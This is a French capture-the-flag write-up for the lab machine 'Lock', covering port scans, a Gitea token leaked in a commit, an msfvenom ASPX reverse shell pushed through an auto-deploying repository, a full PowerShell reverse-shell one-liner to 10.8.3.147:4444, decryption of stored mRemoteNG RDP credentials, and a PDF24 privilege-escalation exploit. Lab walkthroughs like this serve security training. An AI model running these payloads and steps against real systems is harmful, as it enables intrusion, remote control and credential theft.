@@ -1,0 +1,199 @@
+---
+title: Lock - Easy
+description: WU Lock - Easy
+categories: [Writeup]
+tags: [writeup]
+template: doc
+---
+import { Image } from 'astro:assets';
+import banner from '../../../../assets/writeup/vulnlab/banner.jpeg';
+
+<Image src={banner} alt="banner" format="avif" quality={"mid"}/>
+
+
+# LOCK
+
+
+| OS | Difficulty | Target |
+|----|----|----|
+| Windows | <span style="color:green">**EASY**</span> | 10.10.92.237 |
+
+
+
+# 🔭 Enumeration
+
+### PortScan
+
+```
+PORT     STATE SERVICE
+80/tcp   open  http
+445/tcp  open  microsoft-ds
+3000/tcp open  ppp
+3389/tcp open  ms-wbt-server
+```
+Scan approfondit des ports trouvés:
+
+```
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: Lock - Index
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+445/tcp  open  microsoft-ds?
+3000/tcp open  ppp?
+| fingerprint-strings: 
+|   GenericLines, Help, RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Content-Type: text/html; charset=utf-8
+|     Set-Cookie: i_like_gitea=87dfb3e2af70e006; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=40IoXd4T_GFBgYejGbA9it2Tu-g6MTcyNjM0OTU4OTY2NjgxMjUwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Sat, 14 Sep 2024 21:33:09 GMT
+|     <!DOCTYPE html>
+|     <html lang="en-US" class="theme-auto">
+|     <head>
+|     <meta name="viewport" content="width=device-width, initial-scale=1">
+|     <title>Gitea: Git with a cup of tea</title>
+|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
+|   HTTPOptions: 
+|     HTTP/1.0 405 Method Not Allowed
+|     Allow: HEAD
+|     Allow: HEAD
+|     Allow: GET
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Set-Cookie: i_like_gitea=690ad1cf074d552c; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=IlVtCJ-F-vcFbXBL_eRGbH0Nb9Y6MTcyNjM0OTU5NTA2NDE1OTgwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Sat, 14 Sep 2024 21:33:15 GMT
+|_    Content-Length: 0
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=Lock
+| Not valid before: 2024-09-13T21:19:21
+|_Not valid after:  2025-03-15T21:19:21
+|_ssl-date: 2024-09-14T21:35:12+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: LOCK
+|   NetBIOS_Domain_Name: LOCK
+|   NetBIOS_Computer_Name: LOCK
+|   DNS_Domain_Name: Lock
+|   DNS_Computer_Name: Lock
+|   Product_Version: 10.0.20348
+|_  System_Time: 2024-09-14T21:34:32+00:00
+```
+| PORT | PROTOCOL |
+|----|----|
+| 80 | HTTP |
+| 445 | SMB |
+| 3000 | GITEA |
+| 3389 | RDP |
+
+# 👣 Foothold
+
+Un dépôt `Gitea` sur le port 3000. Nous donne un nom d'user `ellen.freeman`. Il y a 2 commits et un script.
+Le commit initial nous permet de récupérer le Token Gitea:
+
+```py
+PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f' 
+```
+
+En jetant un coup d'oeil au script,  on peut voir qu'il énumère l'ensemble des dépôts présents sur Gitea pour un utilisateur donné.
+
+En utilisant le script, nous découvrons un dépôt `/website`
+
+```sh
+python3 repos.py http://lock.vl:3000
+Repositories:
+- ellen.freeman/dev-scripts
+- ellen.freeman/website
+```
+
+Téléchargeons le git:
+
+```sh
+git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@lock.vl:3000/ellen.freeman/website.git
+Cloning into 'website'...
+remote: Enumerating objects: 165, done.
+remote: Counting objects: 100% (165/165), done.
+remote: Compressing objects: 100% (128/128), done.
+remote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0
+Receiving objects: 100% (165/165), 7.16 MiB | 2.58 MiB/s, done.
+Resolving deltas: 100% (35/35), done.
+```
+
+En lisant le fichier `README.md` présent, il est indiqué que chaque modification, apportée au dépôt, est déployée automatiquement.
+
+```sh
+cat readme.md    
+# New Project Website
+
+CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver# 
+```
+
+Création d'un reverse shell avec un fichier `.aspx` puis push vers le dépôt ou en utilisant [ce script](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx)
+```sh
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.3.147 LPORT=4444 -f aspx -o web.aspx
+git config --global user.name ellen.freeman
+git config --global user.email ellen.freeman@lock.vl
+git add web.aspx
+git commit -m "Add web file"
+git push
+```
+
+Dans un autre terminal j'écoute sur le port 4444, puis je me rends sur le lien du fichier en espérant obtenir un reverse shell.
+
+```sh
+nc -lvnp 4444
+```
+
+Sur le lien de la page, je saisis la commande:
+
+```cmd
+/c powershell.exe -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.8.3.147',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+On obtient notre reverse shell, en fouillant dans les répertoires de `ellen.freeman` on trouve un fichier `config.xml`.
+```powershell
+PS C:\Users\ellen.freeman\Documents> cat config.xml
+<?xml version="1.0" encoding="utf-8"?>
+<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp" ConfVersion="2.6">
+    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
+</mrng:Connections>
+```
+
+Le fichier `config.xml` est un fichier pour RemoteNG. J'utilise le script de ce [dépôt](https://github.com/gquere/mRemoteNG_password_decrypt) pour déchiffrer les informations présentes.
+
+```sh
+python3 rng-decrypt.py config.xml   
+Name: RDP/Gale
+Hostname: Lock
+Username: Gale.Dekarios
+Password: ty8wnW9qCKDosXo6
+```
+
+On obtient donc l'user `Gale.Dekarios` et son mot de passe.
+Connectons-nous en RDP.
+
+Le flag user est présent sur le Bureau.
+
+
+# 🎯 Privilege Escalation
+
+A partir de la session de Gale.Dekarios, nous pouvons voir que le logiciel PDF24 est présent. En regardant les détails du programme, la version est la 11.15.1 dont un exploit permet de PrivEsc.
+
+Le lien ci-contre nous indique la [marche à suivre](https://packetstormsecurity.com/files/176206/PDF24-Creator-11.15.1-Local-Privilege-Escalation.html).
+
+- Téléchargeons SetOpLock.exe sur la machine cible ([Github](https://github.com/googleprojectzero/symboliclink-testing-tools/releases/tag/v1.0))
+- Saisissons la commande suivante dans un prompt cmd: `.\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r`
+- Un dossier `_Install`est présent à la racine de `C:` et possède l'installer msi requis pour monter en privilèges.
+- Dans un autre terminal, lançons l'installation avec la commande suivante: `msiexec.exe /fa pdf24-creator-11.15.1-x64.msi`
+- A la fin de l'installation un terminal s'ouvre, il suffit de cliquer droit sur la barre / Propriété et cliquer sur le lien `Legacy console mode link`
+- Sélectionner Firefox, puis `CTRL+O`pour ouvrir `cmd.exe`à partir de Firefox. 
+- Contrôler qui nous sommes avec la commande `whoami /all` 
+
+Vous êtes administrateur, vous pouvez obtenir le flag `root.txt`dans le Desktop d'Administrator.
